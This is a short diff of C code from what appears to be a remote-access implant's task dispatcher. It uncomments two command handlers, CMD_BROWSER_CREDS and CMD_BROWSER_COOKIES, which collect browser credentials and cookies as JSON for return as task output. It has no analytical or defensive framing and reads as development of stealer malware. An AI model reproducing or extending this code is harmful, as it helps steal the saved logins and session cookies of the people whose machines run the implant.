@@ -565,7 +565,6 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
     }
     break;
 
-/*
   case CMD_BROWSER_CREDS:
     {
       char* creds_json = NULL;
@@ -580,9 +579,7 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
       }
     }
     break;
-*/
 
-/*
   case CMD_BROWSER_COOKIES:
     {
       char* cookies_json = NULL;
@@ -597,7 +594,6 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
       }
     }
     break;
-*/
 
   default:
     result->output = str_dup("Unknown command");
